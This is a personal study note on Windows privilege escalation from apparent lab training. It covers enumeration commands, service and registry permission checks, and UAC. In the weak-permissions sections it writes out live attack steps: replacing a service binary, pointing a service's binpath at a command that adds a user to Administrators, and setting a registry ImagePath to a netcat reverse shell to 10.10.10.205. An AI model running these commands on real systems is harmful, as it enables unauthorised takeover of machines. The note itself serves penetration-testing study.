---
tags: [privesc, windows]
aliases: [Other Privesc]
---
The general goal of Windows privilege escalation is to gain access to a member of the Local Administrators group or the NT AUTHORITY\SYSTEM LocalSystem Account. 

Some useful automated tools for privilege escalation are
- Seatbelt
- winPEAS
- PowerUp
- SharpUp
- JAWS
- SessionGopher
- Watson
- LaZagne
- Windows Exploit Suggester - Next Generation
- Sysinternals Suite

# Network Information

Network information can provide means of lateral movement or privilege escalation.

```cmd
# interface, IP, and DNS
ipconfig /all

# ARP table
arp -a

# routing table
route print
```

# Protections

Many organizations will have some sort of protections put in place. Among these exists
- AppLocker that blocks non-admin users from running binaries not needed.

```powershell
# check windows defender
Get-MpComputerStatus

# List AppLocker Rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# test the policy
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

# Initial Enumeration

Some account types we might encounter are:
- `NT AUTHORITY\SYSTEM` or LocalSystem is an account with more privileges than a local administrator and is used to run most Windows services.
- The built-in `administrator` account.
- Member of the local `Administrators` group. Has the same privileges as the built-in adminsitrator.
- Domain admin is a part of the local `Administrators` group.

To enumerate currently running processes we can
```cmd
tasklist /svc
```

Some common services we will see is
- Session Manager Subsystem (smss.exe)
- Client Server Runtime Subsystem (csrss.exe)
- WinLogon (winlogon.exe)
- Local Security Authority Subsystem Service (LSASS)
- Service Host (svchost.exe)

The environment variables explain a lot about the host configuration. A common target is the PATH variable, if the PATH folder is writable we can perform DLL injections against other applications. 

> When running a program, Windows looks for that program in the CWD then from the PATH going left to right.

```cmd
# view the environment variables
set
```

Another command that will give a lot of information about the system
```cmd
systeminfo

# systeminfo may not display hotfixes
wmic qfe

# via powershell
Get-HotFix | ft -AutoSize
```

We may also want to enumerate installed programs
```cmd
wmic product get name

# powershell
Get-WmiObject -Class Win32_Product |  select Name, Version
```

We can also display active TCP and UDP connections to understadn what services are listening on what ports.
```cmd
netstat -ano
```
# Processes

In Windows, access tokens are used to describe the security context of a process or thread. The token includes information about the user account's identity and privileges related to a specific process or thread.  Every time a user interacts with a process, a copy of this token will be presented to determine their privilege level. 

## Network Services

When enumerating network services, if a service is listening on loopback addresses (`127.0.0.1` and `::1`). Developers will assume that only the machine can reach it so it is "safe", but this can be a valid priv esc vector.

## Named Pipes

Processes may also interact with each other via Named Pipes. Pipes are files stored in memory that get cleared out after being read. 

There exists
- Named Pipes as an example `\\.\PipeName\\ExampleNamedPipeServer`. Windows systems use a client-server implementation for pipe communication. The process that creates a named pipe is the server and the process communicating with the pipe is the client. Communicate using a half-duplex (one-way channel with the client only being able to write). Every active connection to a named pipe results in the creation of a new named pipe. These all share the same pipe name but communicate using a different data buffer.
- Anonymous Pipes

```cmd
# list named pipes
pipelist.exe /accepteula

# powershell
gci \\.\pipe\
```

We can then enumerate the permissions of these.
```cmd
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

# Built-In Groups


# User Account Control

Feature that enables a consent prompt for elevated activities. With UAC enabled, applications and tasks always run under the security context of a non-administrator account unless an admin explicitly authorizes these applications/tasks to have admin-level access. Processes are ran with standard user token, and when requiring more rights UAC can provide more rights to the token. 

The default RID 500 Administrator always operated at high mandatory level while new admin accounts (with Admin Approval Mode enabled) will operate under the medium mandatory level. 

```shell
# confirm UAC is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# checking UAC level
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# check windows version
[environment]::OSVersion.Version
```

# Weak Permissions

Services usually install with SYSTEM privileges, so leveraging a service permissions related flaw can lead to complete access.

## File System ACLs

We can use SharpUp to check for service binaries suffering from weak ACLs.

```shell
.\SharpUp.exe audit
```

icacls can then validate our findings by showing who has the permissions.

```shell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

We can then replace the service binary if the service is startable by an unprivileged user

```shell
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

## Service Permissions

Once we identify a service of which we can modify with SharpUp, we can then enumerate permissions on the service with AccessChk.

```shell
# omit banner, supress errors, verbose
accesschk.exe /accepteula -quvcw WindscribeService

# change binary path maliciously
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

# stop and start service
sc stop WindscribeService
sc start WindscribeService
```

After having changed the service we should clean up what happened.

```shell
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"

# start service again
sc start WindScribeService
```

## Unquoted Service Path

When a service is installed the registry specifies a path to the binary. If this binary is not encapsulated with quotes, Windows will attempt to locate the binary in different folders.

`C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

```shell
# searching for unquoted service paths
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

## Permissive Registry ACLs

Checking for weak service ACLs in the registry.

```shell
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

# we can abuse this by changing the imagepath value
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## Modifiable Registry Autorun Binary

If we have write permissions to the registry for a given binary or can overwrite a binary ran at system startup, we can escalate to another user the next that the user logs in.

```shell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

## Related

- [[windows-old]]
- [[citrix-breakout]]
- [[groups|Windows Groups]]
- [[enumerating-security-control|Enumerating Security Controls]]

